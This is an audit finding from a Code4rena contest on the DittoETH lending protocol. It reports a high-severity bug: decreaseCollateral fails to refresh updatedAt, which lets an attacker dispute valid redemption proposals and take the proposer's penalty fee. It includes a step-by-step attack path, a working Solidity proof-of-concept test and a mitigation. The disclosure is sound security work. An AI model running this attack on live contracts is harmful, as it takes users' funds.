---
tags:
  - lang/solidity
  - sector/governance
  - sector/lending
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[DittoETH]]"
auditors:
  - "[[ilchovski]]"
report: "https://code4rena.com/reports/2024-03-dittoeth"
genome:
  - "[[griefing]]"
  - "[[direct-drain]]"
  - "[[access-roles]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-freshness]]"
---
# [H-07] Valid redemption proposals can be disputed by decreasing collateral

- id: 34177
- impact: HIGH
- protocol: [[DittoETH]]
- reporter: ilchovski (Code4rena)
- source: https://code4rena.com/reports/2024-03-dittoeth

## Summary


This bug report discusses a vulnerability in the DittoETH smart contract. The `proposeRedemption` function requires users to provide a list of short records (SRs) with the lowest collateral ratios (CR) in the system. However, the `disputeRedemption` function allows anyone to dispute a proposal and receive a penalty fee from the proposer. This creates an opportunity for an attacker to dispute a valid redemption proposal and steal funds from the proposer. 

To prevent this, the system has a buffer that prevents users from disputing with a SR that was created or modified within 1 hour before the redemption proposal. However, not all functions that modify a SR update the `updatedAt` parameter, allowing an attacker to modify a SR after the proposal and dispute the redemption successfully. 

The `decreaseCollateral` function is one such function that does not update the `updatedAt` parameter. This enables the following attack: 

1. Set the initial collateral ratio (CR) to 1.7 and the maximum redemption CR to 2. 
2. Create a valid redemption proposal with SRs above the initial CR. 
3. The attacker owns a SR with a higher CR and decreases it to the initial CR. 
4. The attacker disputes the redemption and receives the penalty fee. 
5. The attacker increases the CR back up in one transaction. 

To mitigate this vulnerability, the `updatedAt` parameter should be updated when decreasing collateral, or redemption proposals should not be allowed for SRs above the initial CR. This issue has been confirmed and is being addressed by the DittoETH team.

## Details


<https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/RedemptionFacet.sol#L259>

<https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/ShortRecordFacet.sol#L81-L104>

### Impact

When a user creates a redemption proposal with the `proposeRedemption` function the user has to provide a list of the short records (SRs) with the lowest collateral ratios (CR) in the system ascending.

To prevent users from creating proposals with a wrong SR list, anyone is allowed to dispute proposals with the `disputeRedemption` function. This function allows the disputer to prove that a SR with a lower CR was not included in the proposal and for doing so the disputer receives a penalty fee from the proposer. Therefore, if an attacker can dispute a valid redemption proposal, the attacker can steal funds from a proposer.

To avoid malicious disputers the system invented a `DISPUTE_REDEMPTION_BUFFER` that should prevent users from disputing with a SR that was created/modified `<=` 1 hour before the redemption proposal was created:

```solidity
if (disputeCR < incorrectProposal.CR && disputeSR.updatedAt + C.DISPUTE_REDEMPTION_BUFFER <= redeemerAssetUser.timeProposed)
```

But not every function that modifies a SR updates the `updatedAt` param. This enables the possibility for an attacker to dispute a valid redemption proposal by modifying a SR after the proposal so that the proposer does not have the chance to create a correct proposal.

The `decreaseCollateral` function does not update the `updatedAt` param and therefore, the following attack path is enabled:

- `initialCR` of the given asset is set to 1.7 (as in the docs) and the max redemption CR is 2 (constant).
- User creates a valid redemption proposal where the SRs have a CR above the `initialCR`.
- The attacker owns a SR with a CR above the ones in the proposal.
- The attacker decreases the CR of the own SR to the `initialCR`, disputes the redemption to receive the penalty fee, and increases the CR back up in one transaction.

### Proof of Concept

The following POC can be implemented in the `Redemption.t.sol` test file:

```solidity
function test_decrease_cr_dispute_attack() public {
    // add import {O} from "contracts/libraries/DataTypes.sol"; to the imports to run this test

    // create three SRs with increasing CRs above initialCR

    // set initial CR to 1.7 as in the docs
    vm.startPrank(owner);
    diamond.setInitialCR(asset, 170);

    uint80 price = diamond.getOraclePriceT(asset);

    fundLimitBidOpt(price, DEFAULT_AMOUNT, receiver);

    depositEth(sender, price.mulU88(DEFAULT_AMOUNT).mulU88(100e18));

    uint16[] memory shortHintArray = setShortHintArray();
    MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, price, DEFAULT_AMOUNT, orderHintArray, shortHintArray, 70);

    fundLimitBidOpt(price + 1, DEFAULT_AMOUNT, receiver);

    shortHintArray = setShortHintArray();
    orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, price, DEFAULT_AMOUNT, orderHintArray, shortHintArray, 80);

    fundLimitBidOpt(price + 2, DEFAULT_AMOUNT, receiver);

    shortHintArray = setShortHintArray();
    orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, price, DEFAULT_AMOUNT, orderHintArray, shortHintArray, 100);

    skip(1 hours);

    STypes.ShortRecord memory sr1 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID);
    STypes.ShortRecord memory sr2 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+1);
    STypes.ShortRecord memory sr3 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+2);

    uint256 cr1 = diamond.getCollateralRatio(asset, sr1);
    uint256 cr2 = diamond.getCollateralRatio(asset, sr2);
    uint256 cr3 = diamond.getCollateralRatio(asset, sr3);

    // CRs are increasing
    assertGt(cr2, cr1);
    assertGt(cr3, cr2);

    // user proposes a redemption
    uint88 _redemptionAmounts = DEFAULT_AMOUNT * 2;
    uint88 initialErcEscrowed = DEFAULT_AMOUNT;

    MTypes.ProposalInput[] memory proposalInputs =
        makeProposalInputsForDispute({shortId1: C.SHORT_STARTING_ID, shortId2: C.SHORT_STARTING_ID + 1});

    address redeemer = receiver;
    vm.prank(redeemer);
    diamond.proposeRedemption(asset, proposalInputs, _redemptionAmounts, MAX_REDEMPTION_FEE);

    // attacker decreases collateral of a SR with a CR above the ones in the proposal so that they fall below the CR of the SRs in the proposal
    uint32 updatedAtBefore = getShortRecord(sender, C.SHORT_STARTING_ID + 2).updatedAt;

    vm.prank(sender);
    diamond.decreaseCollateral(asset, C.SHORT_STARTING_ID + 2, 0.3e18);

    uint32 updatedAtAfter = getShortRecord(sender, C.SHORT_STARTING_ID + 2).updatedAt;

    // updatedAt param is not updated when decreasing collateral
    assertEq(updatedAtBefore, updatedAtAfter);

    // attacker successfully disputes the redemption proposal
    address disputer = extra;
    vm.prank(disputer);
    diamond.disputeRedemption({
        asset: asset,
        redeemer: redeemer,
        incorrectIndex: 1,
        disputeShorter: sender,
        disputeShortId: C.SHORT_STARTING_ID + 2
    });
}
```

### Recommended Mitigation Steps

Update the `updatedAt` param when decreasing collateral, or do now allow redemption proposals of SRs above the `initialCR` (as decreasing below that is not possible).

### Assessed type

Context

**[ditto-eth (DittoETH) confirmed](https://github.com/code-423n4/2024-03-dittoeth-findings/issues/32#issuecomment-2045979046)**

***
